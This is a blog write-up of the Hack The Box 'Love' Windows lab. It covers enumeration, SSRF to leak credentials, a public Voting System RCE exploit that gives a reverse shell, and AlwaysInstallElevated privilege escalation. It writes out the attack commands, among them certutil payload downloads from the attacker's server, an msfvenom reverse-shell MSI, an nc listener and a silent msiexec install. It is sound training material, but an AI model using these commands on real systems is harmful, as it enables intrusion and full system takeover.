---
layout: post
title:  "Love Writeup - Hack The Box"
date:   2023-11-23
desc: "Server Side Request Forgery, Abusing Voting System, Abusing AlwaysInstallElevated"
keywords: "HTB, eJPT, eWPT, OSCP, Windows, Easy, SSRF, AlwaysInstallElevated"
categories: [HTB]
tags: [HTB,eJPT,eWPT,OSCP,Windows,Easy,SSRF,VotingSystem,AlwaysInstallElevated]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

It's time to test my skills again on a **Windows** machine, in this case the [Hack The Box](https://www.hackthebox.com/){:target="_blank"} **Love** box. It's an easy machine, great for learning how to enumerate and use an automated script to find possible vectors to exploit vulnerabilities and take over the machine, here I go.

<br/><br/>
<img src="{{ site.img_path }}/love_writeup/Love.jpg" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I start as usual, I use the script of the great **Tito S4vi**, **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}**, to deploy the machine, and I can start and investigate about the box. If I list the open ports with `nmap`, as always on a **Windows** machine, it is scary how many there are, but you should always start from the most basic and known to start and list them. I see that there are several ports with **HTTP** protocols, also **SMB**, **HTTPS**, but I also see an interesting subdomain. If I analyze the **ssl** certificate with `openssl` I confirm the existence of the subdomain filtered by `nmap`.

```bash
./htbExplorer -d Love
```

```bash
python3 /usr/bin/whichSystem.py 10.10.10.239

sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.239 -oG allPorts
nmap -sCV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.239 -oN targeted

openssl s_client -connect 10.10.10.239:443
```

<br/>
<img src="{{ site.img_path }}/love_writeup/Love_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I filter for those web services that use the **HTTP** protocol, as I saw there were several, I can use `whatweb` to analyze the type of technologies I am dealing with. Some are available and some are not, if I access the service on port **80** from the browser, it is a sign in page, I try some common credentials and including **SQLi**, but it does not look good. **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, also does not show me a little more information.

```bash
cat targeted | grep http

whatweb http://10.10.10.239 https://10.10.10.239 http://10.10.10.239:5000 http://10.10.10.239:47001
```

<br/>
<img src="{{ site.img_path }}/love_writeup/Love_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Before I continue listing the box, I am going to modify my **Hosts** file to add the domain and subdomain I found earlier. I verify that my machine is resolving well and see if `whatweb` leaks me some more information, but I get nothing. If I access from the browser to the subdomain, I find a **subscription form** but analyzing the code, it seems that it is not working. But there is a **beta** functionality, which allows me to make a request to my machine, but I don't see a future for the moment, because I don't know if a malicious file can be uploaded to the machine.

```bash
vi /etc/hosts
# --> 10.10.10.239    love.htb staging.love.htb

whatweb http://staging.love.htb
```

<br/>
<img src="{{ site.img_path }}/love_writeup/Love_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I also take the opportunity to enumerate port **80** with `nmap` and find some interesting directories to look at later. If I scan the **SMB** protocol, to see if I can find information, I don't have permissions. There is also a web service on port **5000** but it is not accessible from my network, perhaps only from the victim machine. But now I remember the **beta** functionality I found on the subdomain, I'm going to try a **[Server Side Request Forgery](https://portswigger.net/web-security/ssrf){:target="_target"}**, see if I can access the service on port **5000**. Once I send a request to the **localhost**, I get some credentials, I can do this because the request is made by the same machine. Then I try to signin into the service on port **80**, but in the **`admin`** directory that I found with `nmap` and I can access it.

```bash
nmap --script http-enum -p80 10.10.10.239 -oN webScan

poetry run cme smb 10.10.10.239
smbclient -L 10.10.10.239 -N
smbmap -H 10.10.10.239 -u 'null'
```

<br/>
<img src="{{ site.img_path }}/love_writeup/Love_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I look for any exploit for the Voting System with `searchsploit`, I find two very promising ones, because I can get a possible **Remote Command Execution (RCE)** on the victim machine. The first exploit is a **.txt**, which I can try to replicate, but the PATH where I have to send the malicious request is different, and I also see where I have to send the payload.

```bash
searchsploit voting system
searchsploit votingsystem

searchsploit -x php/webapps/50076.txt
```

<br/>
<img src="{{ site.img_path }}/love_writeup/Love_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I replicate the steps indicated by the exploit, I will try to create a new candidate, to capture the request with `burpsuite` and inject the payload. The first thing I see is that in the drop down list to select the **position** of the **candidate** does not have any, so I create the **position** and I can create the **candidate**. When I capture the traffic with `burpsuite`, I still worry about the **Path** where the request is sent, it does not match the exploit, if I perform a **fuzzing** with `gobuster`, I find some interesting directories as the **include**, but not the **upload**, which makes the **RCE** does not work.

```bash
burpsuite &> /dev/null & disown

gobuster dir -u http://10.10.10.239/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
gobuster dir -u http://10.10.10.239/admin -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash
```

<br/>
<img src="{{ site.img_path }}/love_writeup/Love_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br>
<img src="{{ site.img_path }}/love_writeup/Love_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now I'm going to try the other exploit I found, download it to my attacking machine and give it a more descriptive name. Running it with `python3`, it works correctly, and if I make the necessary modifications in the script, like the credentials, the IP, the PATHs, I get a **Reverse Shell** and I can already use some basic reconnaissance commands, to know the privileges of the user with which I could access or system information, I can also access the first flag.

```bash
searchsploit voting system
searchsploit -m php/webapps/49445.py

mv 49445.py voting_system.py
python3 voting_system.py

rlwrap nc -nlvp 443
python3 voting_system.py
```

```powershell
whoami              # love\phoebe
hostname
whoami /priv
whoami /all
net user phoebe
systeminfo
```

<br/>
<img src="{{ site.img_path }}/love_writeup/Love_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

After not finding much in the system, I am going to upload the **[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS ){:target="_blank"}** script from **Carlos Polop** that automates the search for possible attack vectors, to root the box. I transfer it to the victim machine and run it, after a while and analyzing the result, I find a vulnerability, having **AlwaysInstallElevated** enabled can result in a **Privilege Escalation**, as indicated by **[HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated){:target="_blank"}**. As the user has the permissions to install or run **`.msi`** files, I can create a binary with this extension and send me a **Reverse Shell**, using `msfvenom`. I transfer the malicious binary and I can get the shell as the **NT AUTHORITY\SYSTEM** user.

> **Tip**: When I get the results, I can't see the whole report, so I have to modify the **[Scrollback](https://lyz-code.github.io/blue-book/kitty/){:target="_blank"}** of `kitty`, modifying **kitty.conf**.

> **kitty.conf**

```bash
# Add this two lines
scrollback_lines -1
scrollback_pager_history_size 0
```

> **Attacking Machine**:

```bash
python3 -m http.server 80
```

> **Victim Machine**:

```powershell
certutil.exe -f -urlcache -split http://10.10.14.8/winPEAS.exe winPEAS.exe
.\winPEAS.exe

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

> **Attacking Machine**:

```bash
apt search metasploit
apt install metasploit-framework
msfdb run

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 -f msi -o reverse_shell.msi

python3 -m http.server 80
```

> **Victim Machine**:

```powershell
certutil.exe -f -urlcache -split http://10.10.14.8/reverse_shell.msi reverse_shell.msi
```

> **Attacking Machine**:

```bash
rlwrap nc -nlvp 443
```

> **Victime Machine**:

```powershell
msiexec /quiet /qn /i reverse_shell.msi
```

<br/>
<img src="{{ site.img_path }}/love_writeup/Love_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/love_writeup/Love_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> Every time I solve a box with **Windows OS** is very gratifying for me, since I am always playing with **Linux**, and I leave this OS aside, but I must admit that many companies use it, so I must acquire more knowledge of the many features it has. It's time to kill the machine and move on to the next one.

```bash
./htbExplorer -k Love
```
